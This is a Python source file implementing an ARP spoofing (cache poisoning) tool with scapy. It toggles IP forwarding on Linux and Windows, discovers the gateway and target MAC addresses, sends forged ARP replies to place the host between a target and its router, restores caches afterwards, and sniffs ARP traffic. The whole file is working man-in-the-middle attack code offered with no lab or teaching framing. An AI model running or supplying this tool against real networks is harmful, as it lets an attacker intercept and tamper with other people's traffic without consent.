import os
import sys
import netifaces as network_interface
from scapy.all import Ether, ARP, srp, send, sniff
import time
import argparse
import logging




def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def _enable_windows_iproute():
    import winreg
    """
    Enables IP route (IP Forwarding) in Windows
    """
    try:
        # Open the registry key for IP forwarding
        key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            # Set the IPEnableRouter value to 1
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
    except Exception as e:
        print(f"Error enabling IP route: {e}")


def _disable_windows_iproute():
    import winreg
    """
    Disables IP route (IP Forwarding) in Windows
    """
    try:
        # Open the registry key for IP forwarding
        key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            # Set the IPEnableRouter value to 0
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
    except Exception as e:
        print(f"Error disabling IP route: {e}")


def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


def _disable_linux_iproute():
    """
    Disables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 0:
            # already disabled
            return
    with open(file_path, "w") as f:
        print(0, file=f)


def disable_ip_route(verbose=True):
    """
    Disables IP forwarding
    """
    if verbose:
        print("[!] Disabling IP Routing...")
    _disable_windows_iproute() if "nt" in os.name else _disable_linux_iproute()
    if verbose:
        print("[!] IP Routing disabled.")


def get_network():
    """
        Returns a network object containing the current network information
    """
    # get the default interface
    default_interface = network_interface.gateways(
    )['default'][network_interface.AF_INET][1]

    # get the network information
    ip = network_interface.ifaddresses(default_interface)[
        network_interface.AF_INET][0]['addr']
    netmask = network_interface.ifaddresses(default_interface)[
        network_interface.AF_INET][0]['netmask']
    gateway_ip = network_interface.gateways(
    )['default'][network_interface.AF_INET][0]
    mac = network_interface.ifaddresses(default_interface)[
        network_interface.AF_LINK][0]['addr']
    ip_range = '.'.join(ip.split('.')[:-1])

    network_info = {
        "ip": ip,
        "ip_range": ip_range,
        "gateway_ip": gateway_ip,
        "mac": mac,
        "netmask": netmask,
        "interface": default_interface
    }

    return network_info


def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)

    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                       psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                       psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def gather_target_info(target_ip):
    """
    Returns a target object containing the target information
    """
    mac = get_mac(target_ip)

    target_info = {
        "ip": target_ip,
        "mac": mac
    }

    return target_info


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') /
                 ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def sniff_packets(network_info):
  """
  Sniffs the spoofed packets received by the computer
  """
  sniffed_packets = sniff(iface=network_info['interface'], filter="arp", count=10)

  return sniffed_packets